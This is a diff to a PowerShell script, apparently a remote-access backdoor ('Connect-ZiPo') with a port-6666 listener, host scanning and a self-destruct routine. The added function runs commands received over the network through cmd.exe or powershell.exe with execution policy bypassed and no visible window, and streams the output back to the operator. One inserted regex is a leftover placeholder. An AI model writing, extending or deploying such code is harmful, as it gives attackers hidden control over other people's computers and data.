@@ -5,6 +5,54 @@ function Connect-ZiPo {
     $port = 6666
     $currentDir = Get-Location
 
+    function Execute-Command {
+        param(
+            [string]$cmd, 
+            [System.IO.Stream]$stream,
+            [string]$use = "cmd"  # "cmd" или "powershell"
+        )
+        # Выбираем исполняемый файл
+        if ($use -eq "powershell") {
+            $exe = "powershell.exe"
+            # Можно добавить свои аргументы для PowerShell, например, -NoProfile -ExecutionPolicy Bypass -Command
+            $args = "-NoProfile -ExecutionPolicy Bypass -Command $cmd"
+        }
+        else {
+            $exe = "cmd.exe"
+            $args = "/c $cmd"
+        }
+    
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo.FileName = $exe
+        $process.StartInfo.Arguments = $args
+        $process.StartInfo.UseShellExecute = $false
+        $process.StartInfo.RedirectStandardOutput = $true
+        $process.StartInfo.RedirectStandardError = $true
+        $process.StartInfo.CreateNoWindow = $true
+    
+        $process.Start() | Out-Null
+    
+        # Асинхронно считываем стандартный вывод
+        while (-not $process.StandardOutput.EndOfStream) {
+            $line = $process.StandardOutput.ReadLine()
+            if ($line) {
+                $data = [Text.Encoding]::UTF8.GetBytes($line + "`n")
+                $stream.Write($data, 0, $data.Length)
+                $stream.Flush()
+            }
+        }
+        # Также вывод ошибок
+        while (-not $process.StandardError.EndOfStream) {
+            $line = $process.StandardError.ReadLine()
+            if ($line) {
+                $data = [Text.Encoding]::UTF8.GetBytes($line + "`n")
+                $stream.Write($data, 0, $data.Length)
+                $stream.Flush()
+            }
+        }
+        $process.WaitForExit()
+    }
+
 
     function Get-AliveHosts {
     function Is-Alive {
@@ -426,9 +474,11 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         Self-Destruct
                     }
                     else {
-                        $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
-                        $output = & $sb 2>&1 | Out-String
-                        $response = $output.TrimEnd()
+                        # В месте обработки входящей команды:
+                        if ($cmd -notmatch "^(special_command_...|другие команды)$") {
+                            # Выполнение произвольной команды с немедленным стримингом вывода
+                            Execute-Command -cmd $cmd -stream $stream -use "cmd"
+}
                     }
                 }
                 catch {
